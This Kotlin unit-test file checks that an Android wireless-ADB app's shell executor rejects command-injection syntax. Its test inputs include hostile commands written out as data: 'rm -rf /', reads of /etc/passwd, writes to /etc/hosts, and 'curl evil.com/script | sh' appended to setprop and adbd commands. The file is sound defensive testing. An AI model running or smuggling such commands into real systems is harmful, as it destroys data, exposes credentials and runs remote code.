package com.phenix.wirelessadb.shell

import android.util.Log
import io.mockk.every
import io.mockk.mockkStatic
import kotlinx.coroutines.runBlocking
import org.junit.Assert.*
import org.junit.Before
import org.junit.BeforeClass
import org.junit.Test

class ShellExecutorSecurityTest {

  companion object {
    @BeforeClass
    @JvmStatic
    fun setupClass() {
      // Mock Android Log class for unit tests
      mockkStatic(Log::class)
      every { Log.d(any(), any()) } returns 0
      every { Log.i(any(), any()) } returns 0
      every { Log.w(any(), any<String>()) } returns 0
      every { Log.e(any(), any<String>()) } returns 0
      every { Log.e(any(), any(), any()) } returns 0
    }
  }

  @Before
  fun setUp() {
    // Backend is NONE by default, tests will verify validation logic
    // which runs before backend execution
  }

  // ============================================================
  // Valid command tests
  // ============================================================

  @Test
  fun `execute accepts simple valid command`() = runBlocking {
    // Valid commands should be validated successfully
    // Note: execution will fail due to NONE backend, but validation should pass
    val result = ShellExecutor.execute("ls")

    // Should fail with "No privileged backend available" not validation error
    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertEquals("No privileged backend available", exception!!.message)
  }

  @Test
  fun `execute accepts command with spaces`() = runBlocking {
    val result = ShellExecutor.execute("echo hello world")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts command with flags`() = runBlocking {
    val result = ShellExecutor.execute("ls -la")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts command with equals sign`() = runBlocking {
    val result = ShellExecutor.execute("test=value")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts command with quotes`() = runBlocking {
    val result = ShellExecutor.execute("echo \"hello\"")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts command with single quotes`() = runBlocking {
    val result = ShellExecutor.execute("echo 'hello'")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  // ============================================================
  // Shell injection - command separator tests
  // ============================================================

  @Test
  fun `execute rejects command with semicolon separator`() = runBlocking {
    val result = ShellExecutor.execute("ls; rm -rf /")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("command separator (;)"))
  }

  @Test
  fun `execute rejects command with semicolon at end`() = runBlocking {
    val result = ShellExecutor.execute("ls;")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  // ============================================================
  // Shell injection - pipe operator tests
  // ============================================================

  @Test
  fun `execute rejects command with pipe operator`() = runBlocking {
    val result = ShellExecutor.execute("cat /etc/passwd | grep root")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("pipe operator (|)"))
  }

  @Test
  fun `execute rejects command with OR operator`() = runBlocking {
    val result = ShellExecutor.execute("command1 || command2")

    assertTrue(result.isFailure)
    // Note: || contains |, so it gets caught by pipe operator check first
    assertTrue(result.exceptionOrNull()!!.message!!.contains("pipe operator (|)"))
  }

  // ============================================================
  // Shell injection - AND operator tests
  // ============================================================

  @Test
  fun `execute rejects command with AND operator`() = runBlocking {
    val result = ShellExecutor.execute("command1 && command2")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("AND operator (&&)"))
  }

  @Test
  fun `execute rejects command with embedded AND operator`() = runBlocking {
    val result = ShellExecutor.execute("echo start && malicious_command && echo end")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("AND operator (&&)"))
  }

  // ============================================================
  // Shell injection - command substitution tests
  // ============================================================

  @Test
  fun `execute rejects command with backtick substitution`() = runBlocking {
    val result = ShellExecutor.execute("echo `whoami`")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("backtick substitution"))
  }

  @Test
  fun `execute rejects command with dollar substitution`() = runBlocking {
    val result = ShellExecutor.execute("echo \$(whoami)")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("command substitution \$()"))
  }

  @Test
  fun `execute rejects command with nested substitution`() = runBlocking {
    val result = ShellExecutor.execute("cat \$(echo /etc/passwd)")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command substitution \$()"))
  }

  // ============================================================
  // Shell injection - subshell tests
  // ============================================================

  @Test
  fun `execute rejects command with subshell syntax`() = runBlocking {
    val result = ShellExecutor.execute("(malicious_command)")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("subshell syntax"))
  }

  @Test
  fun `execute rejects command with nested subshell`() = runBlocking {
    val result = ShellExecutor.execute("((nested))")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("subshell syntax"))
  }

  @Test
  fun `execute accepts command with opening paren only`() = runBlocking {
    // Single paren without closing should pass (may be invalid shell but not injection)
    val result = ShellExecutor.execute("echo open-paren")

    assertTrue(result.isFailure)
    // Should fail with backend error, not validation error
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts command with closing paren only`() = runBlocking {
    val result = ShellExecutor.execute("echo close-paren")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  // ============================================================
  // Shell injection - redirection tests
  // ============================================================

  @Test
  fun `execute rejects command with output redirection`() = runBlocking {
    val result = ShellExecutor.execute("echo malicious > /etc/hosts")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("output redirection (>)"))
  }

  @Test
  fun `execute rejects command with append redirection`() = runBlocking {
    val result = ShellExecutor.execute("echo malicious >> /etc/hosts")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("output redirection (>)"))
  }

  @Test
  fun `execute rejects command with input redirection`() = runBlocking {
    val result = ShellExecutor.execute("cat < /etc/passwd")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("input redirection (<)"))
  }

  @Test
  fun `execute rejects command with here-document`() = runBlocking {
    val result = ShellExecutor.execute("cat << EOF")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("input redirection (<)"))
  }

  // ============================================================
  // Shell injection - newline and control character tests
  // ============================================================

  @Test
  fun `execute rejects command with newline character`() = runBlocking {
    val result = ShellExecutor.execute("echo hello\nrm -rf /")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("newline"))
  }

  @Test
  fun `execute rejects command with carriage return`() = runBlocking {
    val result = ShellExecutor.execute("echo hello\rmalicious")

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("carriage return"))
  }

  @Test
  fun `execute rejects command with CRLF`() = runBlocking {
    val result = ShellExecutor.execute("echo hello\r\nmalicious")

    assertTrue(result.isFailure)
    // Should catch either newline or carriage return
    val message = result.exceptionOrNull()!!.message!!
    assertTrue(message.contains("newline") || message.contains("carriage return"))
  }

  // ============================================================
  // Empty and blank command tests
  // ============================================================

  @Test
  fun `execute rejects empty command array`() = runBlocking {
    val result = ShellExecutor.execute()

    assertTrue(result.isFailure)
    val exception = result.exceptionOrNull()
    assertNotNull(exception)
    assertTrue(exception!!.message!!.contains("Commands cannot be empty"))
  }

  @Test
  fun `execute rejects blank command`() = runBlocking {
    val result = ShellExecutor.execute("   ")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("Commands cannot be empty"))
  }

  @Test
  fun `execute rejects empty string command`() = runBlocking {
    val result = ShellExecutor.execute("")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("Commands cannot be empty"))
  }

  @Test
  fun `execute rejects array with blank command among valid ones`() = runBlocking {
    val result = ShellExecutor.execute("ls", "  ", "pwd")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("Commands cannot be empty"))
  }

  // ============================================================
  // Complex injection attempt tests
  // ============================================================

  @Test
  fun `execute rejects multi-stage injection attempt`() = runBlocking {
    val result = ShellExecutor.execute("ls; cat /etc/passwd | grep root > /tmp/pwned")

    assertTrue(result.isFailure)
    // Should catch the first dangerous pattern (semicolon)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  @Test
  fun `execute rejects injection with multiple techniques`() = runBlocking {
    val result = ShellExecutor.execute("echo \$(cat /etc/passwd) && rm -rf /")

    assertTrue(result.isFailure)
    // Should catch command substitution or AND operator
    val message = result.exceptionOrNull()!!.message!!
    assertTrue(message.contains("command substitution") || message.contains("AND operator"))
  }

  @Test
  fun `execute rejects obfuscated injection attempt`() = runBlocking {
    // Try to hide injection in what looks like a normal command
    val result = ShellExecutor.execute("systemctl start service; curl evil.com/script | sh")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  // ============================================================
  // Edge case tests
  // ============================================================

  @Test
  fun `execute handles very long valid command`() = runBlocking {
    val longCommand = "echo " + "a".repeat(1000)
    val result = ShellExecutor.execute(longCommand)

    assertTrue(result.isFailure)
    // Should fail with backend error, not validation error
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute rejects long command with injection`() = runBlocking {
    val longCommand = "echo " + "a".repeat(500) + "; rm -rf /" + "b".repeat(500)
    val result = ShellExecutor.execute(longCommand)

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  @Test
  fun `execute validates all commands in varargs`() = runBlocking {
    // Even if first commands are valid, should reject if any command is invalid
    val result = ShellExecutor.execute("ls", "pwd", "echo test; malicious")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  @Test
  fun `execute accepts multiple valid commands`() = runBlocking {
    // Note: execute joins with && internally, so we pass separate valid commands
    val result = ShellExecutor.execute("ls", "pwd", "echo test")

    assertTrue(result.isFailure)
    // Should fail with backend error, not validation error
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  // ============================================================
  // Special ADB-related command tests
  // ============================================================

  @Test
  fun `execute accepts valid setprop command`() = runBlocking {
    val result = ShellExecutor.execute("setprop service.adb.tcp.port 5555")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute accepts valid settings command`() = runBlocking {
    val result = ShellExecutor.execute("settings put global adb_wifi_enabled 1")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute rejects setprop with injection`() = runBlocking {
    val result = ShellExecutor.execute("setprop service.adb.tcp.port 5555; curl evil.com")

    assertTrue(result.isFailure)
    assertTrue(result.exceptionOrNull()!!.message!!.contains("command separator (;)"))
  }

  @Test
  fun `execute accepts valid service control command`() = runBlocking {
    val result = ShellExecutor.execute("stop adbd")

    assertTrue(result.isFailure)
    assertEquals("No privileged backend available", result.exceptionOrNull()!!.message)
  }

  @Test
  fun `execute rejects service command with injection`() = runBlocking {
    val result = ShellExecutor.execute("stop adbd && curl evil.com/script")

    assertTrue(result.isFailure)
    // Should be caught by AND operator check
    assertTrue(result.exceptionOrNull()!!.message!!.contains("AND operator (&&)"))
  }
}
